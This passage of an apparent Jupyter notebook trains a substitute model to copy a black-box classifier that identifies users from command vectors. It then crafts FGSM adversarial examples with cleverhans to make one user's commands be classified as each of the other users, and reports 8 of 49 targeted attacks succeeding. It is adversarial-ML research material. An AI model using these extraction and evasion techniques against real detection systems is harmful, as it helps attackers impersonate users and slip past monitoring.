        "# whilst the cleverhans stuff runs on the CPU and expects numpy.float32 (or vica versa).\n",
        "adversary_test_inputs = adversary_test_inputs.values.astype(numpy.float32)\n",
        "adversary_test_labels = adversary_test_labels.values"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "QPGuaA-mVBPv",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "First, check its accuracy against the true labels:"
      ]
    },
    {
      "metadata": {
        "colab_type": "code",
        "id": "xOOplTcKcpNZ",
        "outputId": "314ede96-2a63-4370-84e2-fa035e193a77",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 34
        }
      },
      "cell_type": "code",
      "source": [
        "adversary_test_labels_one_hot = keras.utils.to_categorical(adversary_test_labels, num_classes=50)\n",
        "\n",
        "# Evaluate the substitute model on clean test examples against true labels\n",
        "acc = model_eval(\n",
        "    tensorflow_session, \n",
        "    input_placeholder,\n",
        "    output_placeholder,\n",
        "    substitute_predictions,\n",
        "    adversary_test_inputs,\n",
        "    adversary_test_labels_one_hot,\n",
        "    args={'batch_size': 32}\n",
        ")\n",
        "acc"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "0.9497074717136745"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 42
        }
      ]
    },
    {
      "metadata": {
        "id": "8x0v7i-TT8BS",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "Next, send this test dataset into the oracle to get its predictions. Then, compare the substitute model's  predictions against those of the oracle. This is important as it allows us to measure how good of an imitation of the oracle our substitute is."
      ]
    },
    {
      "metadata": {
        "id": "LcsqLdLlT5G_",
        "colab_type": "code",
        "outputId": "31db0b6f-d7aa-40a0-a2a4-cf6995ea7bcf",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 34
        }
      },
      "cell_type": "code",
      "source": [
        "oracle_predicted_labels = oracle.predict(adversary_test_inputs)\n",
        "\n",
        "# Evaluate the substitute model on clean test examples against oracle's labels\n",
        "acc = model_eval(\n",
        "    tensorflow_session, \n",
        "    input_placeholder,\n",
        "    output_placeholder,\n",
        "    substitute_predictions,\n",
        "    adversary_test_inputs,\n",
        "    oracle_predicted_labels,\n",
        "    args={'batch_size': 32}\n",
        ")\n",
        "acc"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "0.9500468217080903"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 43
        }
      ]
    },
    {
      "metadata": {
        "id": "Q8F_S8nNUgKT",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "As one would hope, the substitute model is better as a replica than it is a predictor."
      ]
    },
    {
      "metadata": {
        "id": "AyW24uVuUplz",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "## Inspecting the Synthetic Dataset"
      ]
    },
    {
      "metadata": {
        "colab_type": "text",
        "id": "Fpkj-jxkWvQn"
      },
      "cell_type": "markdown",
      "source": [
        "Just inspecting the generated dataset. Notes:\n",
        "  1. Some of the values are negative!\n",
        "  2. The real dataset has an input range of 0-100. This search technique has found all of them, plus a few on each side.\n",
        "  3. The augmented dataset has just less than 200,000 data points. That's almost as many as were used to train the oracle."
      ]
    },
    {
      "metadata": {
        "colab_type": "code",
        "id": "t8HgM1JXTxzj",
        "outputId": "d4ccde35-ee5d-44c8-92e7-8347d0f014f7",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 191
        }
      },
      "cell_type": "code",
      "source": [
        "numpy.unique(adversary_training_inputs)"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "array([ -4.,  -3.,  -2.,  -1.,   0.,   1.,   2.,   3.,   4.,   5.,   6.,\n",
              "         7.,   8.,   9.,  10.,  11.,  12.,  13.,  14.,  15.,  16.,  17.,\n",
              "        18.,  19.,  20.,  21.,  22.,  23.,  24.,  25.,  26.,  27.,  28.,\n",
              "        29.,  30.,  31.,  32.,  33.,  34.,  35.,  36.,  37.,  38.,  39.,\n",
              "        40.,  41.,  42.,  43.,  44.,  45.,  46.,  47.,  48.,  49.,  50.,\n",
              "        51.,  52.,  53.,  54.,  55.,  56.,  57.,  58.,  59.,  60.,  61.,\n",
              "        62.,  63.,  64.,  65.,  66.,  67.,  68.,  69.,  70.,  71.,  72.,\n",
              "        73.,  74.,  75.,  76.,  77.,  78.,  79.,  80.,  81.,  82.,  83.,\n",
              "        84.,  85.,  86.,  87.,  88.,  89.,  90.,  91.,  92.,  93.,  94.,\n",
              "        95.,  96.,  97.,  98.,  99., 100., 101., 102.], dtype=float32)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 44
        }
      ]
    },
    {
      "metadata": {
        "colab_type": "text",
        "id": "qS3LcfujWlvM"
      },
      "cell_type": "markdown",
      "source": [
        "# Crafting Adversarial Examples\n",
        "\n"
      ]
    },
    {
      "metadata": {
        "id": "m5_76KnirHTB",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "def plot_command_vector(command_vector, danger=False):\n",
        "    # reshape into a rectangle, and pad slightly beforehand\n",
        "    rectangle_array= numpy.concatenate([command_vector, numpy.array([0,0])]).reshape((26,33))\n",
        "    normalized_array = sklearn.preprocessing.normalize(rectangle_array)\n",
        "    \n",
        "    color = 'Reds' if danger else 'Greens'\n",
        "    \n",
        "    return seaborn.heatmap(\n",
        "        normalized_array,\n",
        "        square=True,\n",
        "        xticklabels=False,\n",
        "        yticklabels=False,\n",
        "        vmin=0, \n",
        "        vmax=1,\n",
        "        cmap=color,\n",
        "    )"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "TzOmrmaTbgut",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "\n",
        "\n",
        "## Fast Gradient Sign Method\n",
        "\n",
        "Build an attack using the Fast Gradient Sign method. Then generate untargeted adversarial examples for each value in our test set."
      ]
    },
    {
      "metadata": {
        "id": "9RTbGaCxC9A_",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "### Targetting Particular Users\n"
      ]
    },
    {
      "metadata": {
        "id": "ihlyeUfXNqNn",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "We define a function below to take in one particular command vector, and perform a targeted attack against each of the users."
      ]
    },
    {
      "metadata": {
        "id": "wBmYQjCowOFh",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "def run_targeted_attack_against_all_users(command_vector, label, attack, attack_params):\n",
        "    \"\"\"\n",
        "    Runs a targeted attack for the given sample against. For each user, we attempt to generate a\n",
        "    similar command vector to the original, which is classified as that user.\n",
        "    \n",
        "    The command prints a summary of the results to stdout, then returns a dataframe containing, \n",
        "    for each attack:\n",
        "      - the original user\n",
        "      - the targeted user\n",
        "      - the oracle models prediction against the adversarial example\n",
        "      - the oracles certainty of that prediction\n",
        "    \"\"\"    \n",
        "    \n",
        "    # Since we run this once against all users, make 50 replicas of the command vector, and\n",
        "    # original label:\n",
        "    original_label_one_hot = keras.utils.to_categorical(label, num_classes=50)\n",
        "    original_labels = numpy.tile(original_label_one_hot, reps=(50,1))\n",
        "    \n",
        "    original_command_vectors = numpy.tile(command_vector, reps=(50, 1))\n",
        "    \n",
        "    # Our target labels are the one-hot-encoded values 0, 1, 2, ..., 49:\n",
        "    target_labels = keras.utils.to_categorical(range(50), num_classes=50)\n",
        "\n",
        "    attack_params['y_target'] = target_labels\n",
        "    \n",
        "    # Apply the attack, generating the adversarial examples:\n",
        "    adversarial_examples = attack.generate_np(\n",
        "        original_command_vectors,\n",
        "        **attack_params,\n",
        "    )\n",
        "\n",
        "    # Stick these examples into the oracle, and find out what classification it gives:\n",
        "    predictions = oracle.predict(adversarial_examples)\n",
        "\n",
        "    # Format the results into a summary dataframe:\n",
        "    original_label = pandas.Series(\n",
        "        numpy.apply_along_axis(numpy.argmax, axis=1, arr=original_labels), # undo one hot encode\n",
        "        name='Original User',\n",
        "    )\n",
        "    target_label = pandas.Series(\n",
        "        numpy.apply_along_axis(numpy.argmax, axis=1, arr=target_labels), # undo one hot encode\n",
        "        name='Target User',\n",
        "    )\n",
        "    predicted_label = pandas.Series(\n",
        "        numpy.apply_along_axis(numpy.argmax, axis=1, arr=predictions),  # undo one hot encode\n",
        "        name='Oracle Prediction',\n",
        "    )\n",
        "    prediction_certainty = pandas.Series(\n",
        "        numpy.apply_along_axis(numpy.max, axis=1, arr=predictions),\n",
        "        name='Oracle Certainty',\n",
        "    )\n",
        "\n",
        "    summary = pandas.concat(\n",
        "        [\n",
        "            original_label,\n",
        "            target_label,\n",
        "            predicted_label,\n",
        "            prediction_certainty,\n",
        "        ],\n",
        "        axis='columns',\n",
        "    )\n",
        "    \n",
        "    # Count the number of targeted attacks which were succcessful:\n",
        "    successful_attacks = summary.apply(lambda row: row[1] == row[2], axis='columns').sum()\n",
        "    \n",
        "    # Don't count  the original_user -> original_user attack:\n",
        "    successful_attacks -= 1 \n",
        "    total_attacks = 49\n",
        "    \n",
        "    # Print out a little message to say how we did :)\n",
        "    print(\n",
        "        \"A targeted attack was successful against {}/{} users (with the given input):\"\n",
        "        .format(successful_attacks, total_attacks)\n",
        "    )\n",
        "\n",
        "    return summary, adversarial_examples"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "B0QEFE1qMqVu",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "For example, below we take a command vector not yet seen by the substitute model and try to craft adversarial examples targeted at each user. As you can see, the attack is relatively unsucessful."
      ]
    },
    {
      "metadata": {
        "id": "bOi6MhmAMm0c",
        "colab_type": "code",
        "outputId": "27f2340a-b488-42f4-8cbe-eab99285f5ef",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 1652
        }
      },
      "cell_type": "code",
      "source": [
        "summary, adversarial_examples = run_targeted_attack_against_all_users(\n",
        "    adversary_test_inputs[0],\n",
        "    adversary_test_labels[0],\n",
        "    fgsm,\n",
        "    fgsm_par,\n",
        ")\n",
        "summary"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "[INFO 2019-03-21 16:20:04,079 cleverhans] Constructing new graph for attack FastGradientMethod\n"
          ],
          "name": "stderr"
        },
        {
          "output_type": "stream",
          "text": [
            "A targeted attack was successful against 8/49 users (with the given input):\n"
          ],
          "name": "stdout"
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/html": [
              "<div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>Original User</th>\n",
              "      <th>Target User</th>\n",
              "      <th>Oracle Prediction</th>\n",
              "      <th>Oracle Certainty</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>43</td>\n",
              "      <td>0</td>\n",
              "      <td>18</td>\n",
              "      <td>0.999919</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>43</td>\n",
              "      <td>1</td>\n",
              "      <td>18</td>\n",
              "      <td>0.930165</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>43</td>\n",
              "      <td>2</td>\n",
              "      <td>26</td>\n",
              "      <td>0.793800</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>43</td>\n",
              "      <td>3</td>\n",
              "      <td>27</td>\n",
              "      <td>0.999979</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>43</td>\n",
              "      <td>4</td>\n",
              "      <td>2</td>\n",
              "      <td>0.998683</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>5</th>\n",
              "      <td>43</td>\n",
              "      <td>5</td>\n",
              "      <td>11</td>\n",
              "      <td>0.906611</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>6</th>\n",
              "      <td>43</td>\n",
              "      <td>6</td>\n",
              "      <td>2</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>7</th>\n",
              "      <td>43</td>\n",
              "      <td>7</td>\n",
              "      <td>45</td>\n",
              "      <td>0.566652</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>8</th>\n",
              "      <td>43</td>\n",
              "      <td>8</td>\n",
              "      <td>7</td>\n",
              "      <td>0.904598</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>9</th>\n",
              "      <td>43</td>\n",
              "      <td>9</td>\n",
              "      <td>9</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>10</th>\n",
              "      <td>43</td>\n",
              "      <td>10</td>\n",
              "      <td>26</td>\n",
              "      <td>0.981476</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>11</th>\n",
              "      <td>43</td>\n",
              "      <td>11</td>\n",
              "      <td>11</td>\n",
              "      <td>0.972488</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>12</th>\n",
              "      <td>43</td>\n",
              "      <td>12</td>\n",
              "      <td>45</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>13</th>\n",
              "      <td>43</td>\n",
              "      <td>13</td>\n",
              "      <td>45</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>14</th>\n",
              "      <td>43</td>\n",
              "      <td>14</td>\n",
              "      <td>27</td>\n",
              "      <td>0.558632</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>15</th>\n",
              "      <td>43</td>\n",
              "      <td>15</td>\n",
              "      <td>26</td>\n",
              "      <td>0.999389</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>16</th>\n",
              "      <td>43</td>\n",
              "      <td>16</td>\n",
              "      <td>26</td>\n",
              "      <td>0.933712</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>17</th>\n",
              "      <td>43</td>\n",
              "      <td>17</td>\n",
              "      <td>11</td>\n",
              "      <td>0.962532</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>18</th>\n",
              "      <td>43</td>\n",
              "      <td>18</td>\n",
              "      <td>2</td>\n",
              "      <td>0.849187</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>19</th>\n",
              "      <td>43</td>\n",
              "      <td>19</td>\n",
              "      <td>26</td>\n",
              "      <td>0.971559</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>20</th>\n",
              "      <td>43</td>\n",
              "      <td>20</td>\n",
              "      <td>9</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>21</th>\n",
              "      <td>43</td>\n",
              "      <td>21</td>\n",
              "      <td>45</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>22</th>\n",
              "      <td>43</td>\n",
              "      <td>22</td>\n",
              "      <td>45</td>\n",
              "      <td>0.999857</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>23</th>\n",
              "      <td>43</td>\n",
              "      <td>23</td>\n",
              "      <td>23</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>24</th>\n",
              "      <td>43</td>\n",
              "      <td>24</td>\n",
              "      <td>45</td>\n",
              "      <td>0.947013</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>25</th>\n",
              "      <td>43</td>\n",
              "      <td>25</td>\n",
              "      <td>26</td>\n",
              "      <td>0.999979</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>26</th>\n",
              "      <td>43</td>\n",
              "      <td>26</td>\n",
              "      <td>26</td>\n",
              "      <td>0.999915</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>27</th>\n",
              "      <td>43</td>\n",
              "      <td>27</td>\n",
              "      <td>27</td>\n",
              "      <td>0.999166</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>28</th>\n",
              "      <td>43</td>\n",
              "      <td>28</td>\n",
              "      <td>11</td>\n",
              "      <td>0.592794</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>29</th>\n",
              "      <td>43</td>\n",
              "      <td>29</td>\n",
              "      <td>9</td>\n",
              "      <td>0.849746</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>30</th>\n",
              "      <td>43</td>\n",
              "      <td>30</td>\n",
              "      <td>27</td>\n",
              "      <td>0.959036</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>31</th>\n",
              "      <td>43</td>\n",
              "      <td>31</td>\n",
              "      <td>26</td>\n",
              "      <td>0.996926</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>32</th>\n",
              "      <td>43</td>\n",
              "      <td>32</td>\n",
              "      <td>9</td>\n",
              "      <td>0.296662</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>33</th>\n",
              "      <td>43</td>\n",
              "      <td>33</td>\n",
              "      <td>26</td>\n",
              "      <td>0.955576</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>34</th>\n",
              "      <td>43</td>\n",
              "      <td>34</td>\n",
              "      <td>11</td>\n",
              "      <td>0.889263</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>35</th>\n",
              "      <td>43</td>\n",
              "      <td>35</td>\n",
              "      <td>35</td>\n",
              "      <td>0.999999</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>36</th>\n",
              "      <td>43</td>\n",
              "      <td>36</td>\n",
              "      <td>36</td>\n",
              "      <td>0.999981</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>37</th>\n",
              "      <td>43</td>\n",
              "      <td>37</td>\n",
              "      <td>43</td>\n",
              "      <td>0.958634</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>38</th>\n",
              "      <td>43</td>\n",
              "      <td>38</td>\n",
              "      <td>49</td>\n",
              "      <td>0.814296</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>39</th>\n",
              "      <td>43</td>\n",
              "      <td>39</td>\n",
              "      <td>26</td>\n",
              "      <td>0.529316</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>40</th>\n",
              "      <td>43</td>\n",
              "      <td>40</td>\n",
              "      <td>26</td>\n",
              "      <td>0.999995</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>41</th>\n",
              "      <td>43</td>\n",
              "      <td>41</td>\n",
              "      <td>12</td>\n",
              "      <td>0.940027</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>42</th>\n",
              "      <td>43</td>\n",
              "      <td>42</td>\n",
              "      <td>26</td>\n",
              "      <td>0.999425</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>43</th>\n",
              "      <td>43</td>\n",
              "      <td>43</td>\n",
              "      <td>9</td>\n",
              "      <td>0.999699</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>44</th>\n",
              "      <td>43</td>\n",
              "      <td>44</td>\n",
              "      <td>2</td>\n",
              "      <td>0.999800</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>45</th>\n",
              "      <td>43</td>\n",
              "      <td>45</td>\n",
              "      <td>45</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>46</th>\n",
              "      <td>43</td>\n",
              "      <td>46</td>\n",
              "      <td>45</td>\n",
              "      <td>0.631968</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>47</th>\n",
              "      <td>43</td>\n",
              "      <td>47</td>\n",
              "      <td>9</td>\n",
              "      <td>0.903847</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>48</th>\n",
              "      <td>43</td>\n",
              "      <td>48</td>\n",
              "      <td>2</td>\n",
              "      <td>0.999981</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>49</th>\n",
              "      <td>43</td>\n",
              "      <td>49</td>\n",
              "      <td>49</td>\n",
              "      <td>0.999999</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>"
            ],
            "text/plain": [
              "    Original User  Target User  Oracle Prediction  Oracle Certainty\n",
              "0              43            0                 18          0.999919\n",
              "1              43            1                 18          0.930165\n",
              "2              43            2                 26          0.793800\n",
              "3              43            3                 27          0.999979\n",
              "4              43            4                  2          0.998683\n",
              "5              43            5                 11          0.906611\n",
              "6              43            6                  2          1.000000\n",
              "7              43            7                 45          0.566652\n",
              "8              43            8                  7          0.904598\n",
              "9              43            9                  9          1.000000\n",
              "10             43           10                 26          0.981476\n",
              "11             43           11                 11          0.972488\n",
              "12             43           12                 45          1.000000\n",
              "13             43           13                 45          1.000000\n",
              "14             43           14                 27          0.558632\n",
              "15             43           15                 26          0.999389\n",
              "16             43           16                 26          0.933712\n",
              "17             43           17                 11          0.962532\n",
              "18             43           18                  2          0.849187\n",
              "19             43           19                 26          0.971559\n",
              "20             43           20                  9          1.000000\n",
              "21             43           21                 45          1.000000\n",
              "22             43           22                 45          0.999857\n",
              "23             43           23                 23          1.000000\n",
              "24             43           24                 45          0.947013\n",
              "25             43           25                 26          0.999979\n",
              "26             43           26                 26          0.999915\n",
              "27             43           27                 27          0.999166\n",
              "28             43           28                 11          0.592794\n",
              "29             43           29                  9          0.849746\n",
              "30             43           30                 27          0.959036\n",
              "31             43           31                 26          0.996926\n",
              "32             43           32                  9          0.296662\n",
              "33             43           33                 26          0.955576\n",
              "34             43           34                 11          0.889263\n",
              "35             43           35                 35          0.999999\n",
              "36             43           36                 36          0.999981\n",
              "37             43           37                 43          0.958634\n",
              "38             43           38                 49          0.814296\n",
              "39             43           39                 26          0.529316\n",
              "40             43           40                 26          0.999995\n",
              "41             43           41                 12          0.940027\n",
              "42             43           42                 26          0.999425\n",
              "43             43           43                  9          0.999699\n",
              "44             43           44                  2          0.999800\n",
              "45             43           45                 45          1.000000\n",
              "46             43           46                 45          0.631968\n",
              "47             43           47                  9          0.903847\n",
              "48             43           48                  2          0.999981\n",
              "49             43           49                 49          0.999999"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 56
        }
      ]
    },
    {
      "metadata": {
        "id": "mspvKRbob1iV",
        "colab_type": "code",
        "outputId": "3ecd7ff5-7a0c-4905-abda-7d253e2b6a77",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 357
        }
      },
      "cell_type": "code",
      "source": [
        "plot_command_vector(adversary_test_inputs[0])"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<matplotlib.axes._subplots.AxesSubplot at 0x7fe5f8733eb8>"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 57
        },
        {
          "output_type": "display_data",
          "data": {
            "image/png": "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\nuM4Lulry/U/Fmr/5c